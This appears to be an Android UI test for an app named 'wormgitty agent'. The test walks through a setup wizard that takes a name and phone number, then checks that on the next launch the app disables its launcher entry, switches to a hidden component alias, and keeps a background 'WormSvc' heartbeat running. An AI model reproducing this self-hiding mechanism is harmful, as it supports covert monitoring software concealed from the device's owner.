package com.wormgitty.agent

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import androidx.compose.ui.test.junit4.createEmptyComposeRule
import androidx.compose.ui.test.onNodeWithTag
import androidx.compose.ui.test.performClick
import androidx.compose.ui.test.performTextInput
import androidx.test.core.app.ActivityScenario
import androidx.test.core.app.ApplicationProvider
import androidx.test.ext.junit.runners.AndroidJUnit4
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import java.util.concurrent.TimeUnit

/** End-to-end happy path: wizard, lock arms pendingHide, SECOND launch hides. */
@RunWith(AndroidJUnit4::class)
class WizardFlowTest {

    @get:Rule
    val compose = createEmptyComposeRule()

    @Test
    fun lockDoesNotHideImmediatelyButSecondLaunchDoes() {
        val context = ApplicationProvider.getApplicationContext<android.content.Context>()
        val pkg = context.packageName
        val pm = context.packageManager
        val boost = ComponentName(pkg, "$pkg.LauncherBoost")
        val hidden = ComponentName(pkg, "$pkg.LauncherHidden")

        val intent = Intent(context, MainActivity::class.java)
            .putExtra(MainActivity.EXTRA_MOCK_PERMS, true)
        ActivityScenario.launch<MainActivity>(intent).use {
            compose.waitForIdle()
            compose.onNodeWithTag("next_intro").performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("name_input").performTextInput("اختبار")
            compose.waitForIdle()
            compose.onNodeWithTag("next_name").assertExists().performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("next_checklist").performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("phone_input").performTextInput("01012345678")
            compose.waitForIdle()
            compose.onNodeWithTag("next_phone").performClick()
            compose.waitForIdle()

            compose.onNodeWithTag("lock_btn").performClick()
            compose.waitForIdle()

            // First launch ends; flags must still be in shipped state.
            TimeUnit.SECONDS.sleep(2)
        }

        assertEquals(
            "boost must stay enabled right after lock (hide is next launch)",
            PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            pm.getComponentEnabledSetting(boost)
        )

        // Second launch consumes pendingHide and performs the vanish.
        ActivityScenario.launch<MainActivity>(intent)
        TimeUnit.SECONDS.sleep(4)

        assertEquals(
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            pm.getComponentEnabledSetting(boost)
        )
        assertEquals(
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            pm.getComponentEnabledSetting(hidden)
        )
        assertTrue("heartbeat file missing", WormSvc.heartbeatFile(context).length() > 0)
        assertFalse(
            "pendingHide must be consumed",
            runBlocking { HidePrefs(context).pendingHide() }
        )
    }
}
